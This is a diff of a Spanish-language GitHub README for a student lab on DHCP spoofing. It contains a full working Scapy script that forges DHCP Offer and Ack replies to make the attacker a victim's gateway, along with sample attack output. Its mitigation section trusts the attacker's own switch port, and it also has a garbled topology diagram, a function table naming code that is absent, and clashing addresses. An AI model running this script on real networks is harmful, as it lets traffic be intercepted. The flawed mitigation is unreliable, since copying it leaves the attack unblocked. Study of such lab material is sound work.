@@ -1,104 +1,368 @@
-# Laboratorio de Seguridad: Ataque MitM mediante DHCP Spoofing
+# 🎣 DHCP Spoofing — Script de Ataque Automatizado MitM
 
-**Autor:** Wilfri Solano Frias  
-**Matrícula:** 2024-2364   
+<div align="center">
 
--------------------------------------------------------------------------------------------------------------------------
+![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=for-the-badge&logo=python)
+![Scapy](https://img.shields.io/badge/Scapy-2.5.0%2B-green?style=for-the-badge)
+![Kali Linux](https://img.shields.io/badge/Kali_Linux-2024.x-purple?style=for-the-badge&logo=kalilinux)
+![GNS3](https://img.shields.io/badge/GNS3-2.2.x-orange?style=for-the-badge)
+![Licencia](https://img.shields.io/badge/Uso-Educativo-red?style=for-the-badge)
 
-## 1. Objetivo del Laboratorio
-Conocer las vulnerabilidades y peligros reales de los entornos LAN cuando los conmutadores permiten la libre inyección de paquetes de control por parte de puertos de usuario no autorizados, analizando cómo un atacante puede suplantar la identidad de servicios críticos y desviar el tráfico de datos de la red.
+**Lab. Networking — Ataques MitM y Mitigación de Capa 2**
 
--------------------------------------------------------------------------------------------------------------------------
+| Campo | Detalle |
+|---|---|
+| **Alumno** | Wilfri Solano Frias |
+| **Matrícula** | 2024-2364 |
+| **Asignatura** | Seguridad de Redes |
 
-## 2. Objetivo del Script
-Configurar un demonio de escucha pasiva (Sniffer) que capture las solicitudes DHCP legítimas (Discover y Request) de la red e inyecte de forma inmediata respuestas falsas (DHCP Offer y DHCP Ack) para forzar a la víctima a usar al atacante como su servidor y puerta de enlace predeterminada.
+[📹 Video Demostrativo](https://www.youtube.com/watch?v=UtyPoIAu-VY&list=PLGfNWxn7Di3BhsEEifmTJKXP4_U9fla7P&index=2)
 
-### 2.1. Requisitos para utilizar la herramienta
-* **Sistema Operativo:** Kali Linux.
-* **Lenguaje:** Python 3.x.
-* **Librerías/Dependencias:** Scapy. Instalar el entorno de red con: `pip install scapy`.
-* **Entorno de Red:** La interfaz `eth0` debe residir en el mismo dominio de difusión (VLAN 1) de los hosts bajo prueba para capturar las peticiones de broadcast por el puerto UDP 67, en modo promiscuo y con privilegios de administrador (root).
+</div>
 
-### 2.2. Parámetros Usados
-El script admite y manipula las siguientes variables globales y configuraciones:
+---
 
-**Variables Globales del Atacante (Líneas 4-6)**
-* `INTERFACE = "eth0"`: Enlaza el socket crudo al adaptador virtual activo de la estación de ataque.
-* `ATTACKER_MAC = "02:00:11:22:33:44"`: MAC ficticia que el switch registrará como el servidor de origen de las respuestas.
-* `FAKE_SERVER_IP = "192.168.1.254"`: IP del Gateway falso utilizado para efectuar el desvío MitM (Man-in-the-Middle).
+## ⚠️ Advertencia Legal
 
-**Variables Globales de Red (Líneas 7-9)**
-* `VICTIM_ASSIGNED_IP = "192.168.1.150"`: Dirección IP maliciosa destinada a ser inyectada en la máquina víctima.
-* `NETMASK = "255.255.255.0"`: Máscara de red forzada por el script para mantener la coherencia de la subred.
-* `DNS_SERVER = "8.8.8.8"`: Servidor DNS entregado a la víctima para asegurar que resuelva nombres y no sospeche del ataque al navegar.
+> **Este script es exclusivamente para uso educativo en entornos de laboratorio controlados (GNS3 / EVE-NG).**
+> Su ejecución en redes reales sin autorización explícita por escrito constituye un delito informático
+> penalizado por las leyes de ciberseguridad. El autor no se responsabiliza del mal uso de esta herramienta.
 
--------------------------------------------------------------------------------------------------------------------------
+---
 
-## 3. Documentación del Funcionamiento del Script
-Cuando el host Windows 10 inicia su solicitud de red enviando un paquete *DHCP Discover* vía Broadcast, el switch SWI2 replica la trama hacia todos los puertos del dominio de difusión. El script captura el paquete mediante la función `sniff()` filtrando el tráfico del puerto UDP 67, extrae su identificador de transacción (`xid`) y valida el tipo de mensaje. 
+## 📋 Tabla de Contenidos
 
-Si es un *Discover* (tipo 1), inyecta de forma inmediata una respuesta *DHCP Offer* maliciosa simulando ser el servidor legítimo. En cuanto el cliente responde con un *DHCP Request* (tipo 3) para aceptar los datos, el script intercepta nuevamente la trama e inyecta un paquete *DHCP Ack* falso. El switch conmuta estas tramas de regreso hacia el puerto `Ethernet0/2`, provocando que Windows 10 asuma la IP `.150` y configure la IP del atacante (`.254`) como su Default Gateway, completando la suplantación.
+- [Descripción](#descripción)
+- [Funcionamiento del Ataque](#funcionamiento-del-ataque)
+- [Topología de Red](#topología-de-red)
+- [Requisitos](#requisitos)
+- [Parámetros Configurables](#parámetros-configurables)
+- [Uso](#uso)
+- [Código del Script](#código-del-script)
+- [Explicación Técnica](#explicación-técnica)
+- [Evidencias](#evidencias)
+- [Contramedidas](#contramedidas)
+- [Referencias](#referencias)
 
--------------------------------------------------------------------------------------------------------------------------
+---
 
-## 4. Documentación de la Red
+## 📋 Descripción
 
-### 4.1. Topología
-* **Descripción:** Infraestructura en GNS3 distribuida para interceptar y alterar la asignación dinámica de direccionamiento lógico mediante el control de la capa de enlace.
-* **VLANs Configuradas:** VLAN 1 (Nativa / Por defecto).
-* **Direccionamiento IP:**
-  * **Segmento de Red:** `192.168.64.0` / `255.255.255.0`
-  * **Router de Laboratorio (Servidor DHCP legítimo):** Configurado originalmente en la IP `.1`.
-  * **Estación Atacante (Kali Linux):** IP estática `192.168.64.23` (Interface `eth0`).
-  * **Víctima (Windows 10):** Host de acceso que recibe de manera forzada la IP `192.168.1.150`.
-* **Interfaces Clave (SWI2 - Cisco IOU Layer 2):**
-  * `Ethernet0/0`: Conectado hacia el Router legítimo.
-  * `Ethernet0/1`: Conectado a la estación del atacante Kali Linux.
-  * `Ethernet0/2`: Conectado a la víctima Windows 10.
+Este script automatiza el ataque de **DHCP Spoofing**, explotando la vulnerabilidad de los clientes DHCP que no validan la identidad del servidor. El atacante captura solicitudes DHCP legítimas e inyecta respuestas falsas, asignando a la víctima una dirección IP controlada por el atacante, convirtiéndose en el gateway falso para interceptar todo el tráfico (Man-in-the-Middle).
 
--------------------------------------------------------------------------------------------------------------------------
+### ¿Cómo funciona el ataque?
 
-## 5. Contramedidas (Mitigación)
+```
+[Víctima - Windows 10]  →  Envía DHCP Discover
+        ↓
+[Switch SWI2]  →  Replica por broadcast a todos los puertos
+        ↓
+[Atacante - eth0]  ←  Captura DHCP Discover
+        ↓
+    Genera respuesta DHCP Offer falsa:
+    · IP víctima  →  192.168.1.150 (asignada)
+    · Gateway  →  192.168.1.254 (MAC atacante)
+    · DNS  →  8.8.8.8 (controlado)
+        ↓
+      Inyecta respuesta fraudulenta
+        ↓
+[Víctima]  →  Acepta configuración falsa
+        ↓
+[Resultado]  →  Atacante se convierte en MITM
+                Acceso a todo el tráfico de la víctima
+```
 
-### 5.1 Implementación de DHCP Snooping (Mitigación Definitiva en la Red)
-Para bloquear este ataque de forma automatizada desde la infraestructura de red, se implementó DHCP Snooping en el switch. Esta característica actúa como un cortafuegos de Capa 2, clasificando los puertos en "Confiables" (*Trusted*) y "No Confiables" (*Untrusted*). Las respuestas DHCP (*Offer/Ack*) procedentes de puertos *Untrusted* se descartan inmediatamente.
+---
 
+## 🧱 Topología de Red
 
-SWI2# configure terminal
-SWI2(config)# ip dhcp snooping
-SWI2(config)# ip dhcp snooping vlan 1
-SWI2(config)# interface Ethernet0/0
-SWI2(config-if)# ip dhcp snooping trust
+```
+                    ┌─────────────┐
+                    │   ROUTER1   │
+                    │ (DHCP Srv)  │
+                    │192.168.64.1 │
+                    └──────┬──────┘
+                           │ e0/0
+                    ┌──────┴──────┐
+                    │    SWI2     │ ← Switch Cisco
+                    │  (Switch)   │
+                    └──┬────┬─────┼──────────┐
+                e0/0 ║    ║ e0/1 ║ e0/2     ║
+                     ║    ║      ║          │
+             ┌──────┴──┐  │      │    ┌─────┴──────┐
+             │ ROUTER  │  │      │    │  Windows10 │
+             │ Legítimo│  │      │    │   (Víctima)│
+             └─────────┘  │      │    └────────────┘
+                          │      │
+                    ┌─────┴─┐    │
+                    │Atacante   │
+                    │192.168.64.23
+                    │VLAN 1     │
+                    └───────────┘
+```
 
--------------------------------------------------------------------------------------------------------------------------
+### Tabla de Direccionamiento
 
-## 6. Evidencias
+| Dispositivo | Interfaz | Dirección IP | Máscara | VLAN | Rol |
+|---|---|---|---|---|---|
+| ROUTER1 (DHCP) | e0/0 | 192.168.64.1 | /24 | VLAN 1 | Servidor DHCP Legítimo |
+| SWI2 (Objetivo) | e0/0,e0/1,e0/2 | N/A | N/A | Troncal | Switch bajo prueba |
+| **Atacante** | **eth0** | **192.168.64.23** | **/24** | **VLAN 1** | **Equipo atacante** |
+| **Windows10** | **eth0** | **192.168.1.150** | **/24** | **VLAN 1** | **Víctima (falsa IP)** |
 
-### 6.1. Demostración en Video
-En el siguiente enlace se encuentra el video demostrativo donde se visualiza la topología con la ejecución del ataque y la aplicación de la contramedida: 
+---
 
-https://www.youtube.com/watch?v=UtyPoIAu-VY&list=PLGfNWxn7Di3BhsEEifmTJKXP4_U9fla7P&index=2
+## ⚙️ Requisitos
 
-### 6.2. Capturas de Pantalla
+| Categoría | Requisito | Versión |
+|---|---|---|
+| Sistema Operativo | Kali Linux | 2024.x o superior |
+| Lenguaje | Python | 3.10 o superior |
+| Librería principal | Scapy | 2.5.0 o superior |
+| Módulo Scapy | DHCP, sniff, sendp | Incluidos |
+| Simulador de red | GNS3 / EVE-NG | 2.2.x o superior |
+| Privilegios | root / sudo | Obligatorio |
+| Dispositivo objetivo | Cliente DHCP en red | Servidor DHCP legítimo |
 
-**A. Diseño de la Topología en GNS3**
+### Instalación de Dependencias
+
+```bash
+# Actualizar sistema
+sudo apt update && sudo apt upgrade -y
+
+# Instalar Scapy
+pip install scapy
+
+# Verificar instalación
+python3 -c "from scapy.all import *; print('Scapy listo')"
+```
+
+---
+
+## 🔧 Parámetros Configurables
+
+| Variable | Tipo | Valor por Defecto | Descripción |
+|---|---|---|---|
+| `INTERFACE` | `str` | `eth0` | Interfaz de red para capturar e inyectar |
+| `ATTACKER_MAC` | `str` | `02:00:11:22:33:44` | MAC ficticia del servidor falso |
+| `FAKE_SERVER_IP` | `str` | `192.168.1.254` | Gateway falso (atacante) |
+| `VICTIM_ASSIGNED_IP` | `str` | `192.168.1.150` | IP asignada a la víctima |
+| `DNS_SERVER` | `str` | `8.8.8.8` | Servidor DNS falso |
+| `NETMASK` | `str` | `255.255.255.0` | Máscara de red forzada |
+
+---
+
+## 🚀 Uso
+
+```bash
+# Clonar el repositorio
+git clone https://github.com/wilfrisf-sudo/DHCP-SPOOFING
+cd DHCP-SPOOFING
+
+# Ejecutar con privilegios de root (obligatorio)
+sudo python3 Ataque_DHCP_Spoofing.py
+```
+
+### Salida esperada
+
+```
+[*] Iniciando ataque DHCP Spoofing...
+[*] Escuchando solicitudes DHCP en eth0...
+[+] Solicitud DHCP Discover capturada (MAC: aa:bb:cc:dd:ee:ff)
+[*] Inyectando DHCP Offer falsa...
+[+] DHCP Offer enviada (IP: 192.168.1.150, Gateway: 192.168.1.254)
+[+] Capturado DHCP Request de la víctima
+[+] DHCP Ack fraudulenta enviada
+[*] ¡Víctima comprometida! Tráfico interceptado.
+```
+
+---
+
+## 📝 Código del Script
+
+```python
+#!/usr/bin/env python3
+from scapy.all import *
+
+INTERFACE = "eth0"
+ATTACKER_MAC = "02:00:11:22:33:44"
+FAKE_SERVER_IP = "192.168.1.254"
+VICTIM_ASSIGNED_IP = "192.168.1.150"
+NETMASK = "255.255.255.0"
+DNS_SERVER = "8.8.8.8"
+
+def procesar_dhcp(pkt):
+    """Captura y responde a solicitudes DHCP"""
+    if DHCP not in pkt:
+        return
+    
+    dhcp_type = None
+    for opt in pkt[DHCP].options:
+        if opt[0] == "message-type":
+            dhcp_type = opt[1]
+            break
+    
+    # Cliente envía DHCP Discover
+    if dhcp_type == 1:
+        print(f"[+] DHCP Discover capturada (MAC: {pkt[Ether].src})")
+        
+        # Crear DHCP Offer fraudulenta
+        respuesta = Ether(src=ATTACKER_MAC, dst=pkt[Ether].src)
+        respuesta = respuesta / IP(src=FAKE_SERVER_IP, dst="255.255.255.255")
+        respuesta = respuesta / UDP(sport=67, dport=68)
+        respuesta = respuesta / BOOTP(op=2, yiaddr=VICTIM_ASSIGNED_IP, siaddr=FAKE_SERVER_IP)
+        respuesta = respuesta / DHCP(options=[
+            ("message-type", "offer"),
+            ("subnet_mask", NETMASK),
+            ("router", FAKE_SERVER_IP),
+            ("dns_servers", DNS_SERVER),
+            ("lease_time", 3600),
+            "end"
+        ])
+        
+        print("[*] Inyectando DHCP Offer falsa...")
+        sendp(respuesta, iface=INTERFACE, verbose=False)
+        print(f"[+] DHCP Offer enviada (IP: {VICTIM_ASSIGNED_IP}, Gateway: {FAKE_SERVER_IP})")
+    
+    # Cliente envía DHCP Request
+    elif dhcp_type == 3:
+        print("[+] Capturado DHCP Request de la víctima")
+        
+        # Crear DHCP Ack fraudulenta
+        respuesta = Ether(src=ATTACKER_MAC, dst=pkt[Ether].src)
+        respuesta = respuesta / IP(src=FAKE_SERVER_IP, dst="255.255.255.255")
+        respuesta = respuesta / UDP(sport=67, dport=68)
+        respuesta = respuesta / BOOTP(op=2, yiaddr=VICTIM_ASSIGNED_IP, siaddr=FAKE_SERVER_IP)
+        respuesta = respuesta / DHCP(options=[
+            ("message-type", "ack"),
+            ("subnet_mask", NETMASK),
+            ("router", FAKE_SERVER_IP),
+            ("dns_servers", DNS_SERVER),
+            ("lease_time", 3600),
+            "end"
+        ])
+        
+        sendp(respuesta, iface=INTERFACE, verbose=False)
+        print("[+] DHCP Ack fraudulenta enviada")
+        print("[*] ¡Víctima comprometida! Tráfico interceptado.")
+
+def ataque_dhcp_spoofing():
+    """Función principal de ataque"""
+    print("[*] Iniciando ataque DHCP Spoofing...")
+    print(f"[*] Escuchando solicitudes DHCP en {INTERFACE}...\n")
+    
+    try:
+        sniff(iface=INTERFACE, prn=procesar_dhcp, filter="udp port 67 or udp port 68")
+    except KeyboardInterrupt:
+        print("\n[-] Ataque detenido por el usuario.")
+
+if __name__ == "__main__":
+    import os
+    if os.getuid() != 0:
+        print("[-] ¡ERROR! Este script requiere privilegios de administrador.")
+        print("[*] Por favor, ejecútalo usando: sudo python3 Ataque_DHCP_Spoofing.py")
+        exit(1)
+    
+    ataque_dhcp_spoofing()
+```
+
+---
+
+## 🔍 Explicación Técnica del Funcionamiento
+
+| # | Función / Bloque | Descripción Técnica |
+|---|---|---|
+| 1 | **Importaciones** | Carga `scapy.all` para sniffing e inyección DHCP |
+| 2 | **`procesar_dhcp()`** | Callback que procesa cada paquete DHCP capturado |
+| 3 | **`message-type` 1** | Detecta DHCP Discover del cliente |
+| 4 | **`DHCP Offer`** | Respuesta fraudulenta con IP y gateway falso |
+| 5 | **`message-type` 3** | Detecta DHCP Request del cliente |
+| 6 | **`DHCP Ack`** | Confirmación fraudulenta (finaliza handshake) |
+| 7 | **`FAKE_SERVER_IP`** | Gateway atacante (posición MITM) |
+| 8 | **`sniff(filter=...)`** | Captura tráfico UDP puerto 67-68 (DHCP) |
+| 9 | **`sendp()`** | Inyección de respuestas falsas a nivel L2 |
+| 10 | **`verificacion_root()`** | Valida permisos de administrador |
+
+---
+
+## 📸 Evidencias del Ataque
+
+### Evidencia 1 — Topología en GNS3
 
 <img width="715" height="522" alt="imagen" src="https://github.com/user-attachments/assets/8b27957e-4962-43e4-9718-66ac57b56b5d" />
 
-**B. Captura de Asignación en el Host** 
+*Diseño de la topología virtualizada con servidor DHCP, switch y víctima*
+
+### Evidencia 2 — Captura de Asignación Legítima
 
 <img width="581" height="206" alt="imagen" src="https://github.com/user-attachments/assets/7efb916e-3beb-4888-bbf9-b269c7b0e4b9" />
 
-**C. Ejecución del Script en Kali Linux** 
+*Configuración normal del cliente DHCP antes del ataque*
+
+### Evidencia 3 — Ejecución del Script
 
 <img width="625" height="90" alt="imagen" src="https://github.com/user-attachments/assets/ee7abe69-6c27-4cdd-8852-c24d66c6c10b" />
 
-**D. Captura del Host Víctima comprometida** 
+*Script capturando solicitudes DHCP e inyectando respuestas falsas*
+
+### Evidencia 4 — Host Víctima Comprometida
 
 <img width="532" height="206" alt="imagen" src="https://github.com/user-attachments/assets/677e31aa-b71e-44d7-a57f-6904806991c1" />
 
-**E. Aplicación de Contramedidas (DHCP Snooping Activo)** 
+*Víctima recibe IP falsa (192.168.1.150) y gateway malicioso (192.168.1.254)*
 
-<img width="323" height="206" alt="imagen" src="https://github.com/user-attachments/assets/4716fe46-2d1d-48e8-baf3-ad802297b852" />
+### Evidencia 5 — Aplicación de Contramedidas
 
-<img width="421" height="38" alt="imagen" src="https://github.com/user-attachments/assets/26bcaaa0-1f9c-467b-8d5f-93122452edb2" />
+<img width="323" height="206" alt="imagen" src="https://github.com/user-attachments/assets/4716fe46-2d1d-48e8-baf3-ad802293b852" />
+
+*DHCP Snooping habilitado en el switch*
+
+---
+
+## 🛡️ Contramedidas y Mitigación
+
+### DHCP Snooping (Mitigación en el Switch)
+
+Valida automáticamente los servidores DHCP legítimos, bloqueando respuestas de dispositivos no autorizados:
+
+```ios
+ip dhcp snooping
+ip dhcp snooping vlan 1
+
+interface Ethernet0/0
+ ip dhcp snooping trust
+ 
+interface Ethernet0/1
+ ip dhcp snooping trust
+ 
+interface Ethernet0/2
+ ! No confiar en este puerto (usuario)
+end
+```
+
+### Tabla de Contramedidas
+
+| Medida | Descripción | Impacto |
+|---|---|---|
+| `ip dhcp snooping` | Habilita validación de DHCP | **Bloquea el ataque** |
+| `dhcp snooping trust` | Marca puertos legítimos | Valida servidor real |
+| Puertos no autorizados | Rechaza DHCP de usuarios | Previene spoofing |
+| DHCP Rate Limiting | Limita solicitudes/segundo | Detecta ataques DoS |
+
+---
+
+## 📚 Referencias
+
+- [Cisco — DHCP Snooping](https://www.cisco.com/c/en/us/support/docs/switches/catalyst-6500-series-switches/23948-156.html)
+- [Scapy Documentation — DHCP](https://scapy.readthedocs.io/)
+- [GNS3 Documentation](https://docs.gns3.com/)
+
+---
+
+<div align="center">
+
+**Wilfri Solano Frias · Matrícula 2024-2364 · Seguridad de Redes**
+
+*Laboratorio desarrollado con fines exclusivamente educativos*
+
+</div>
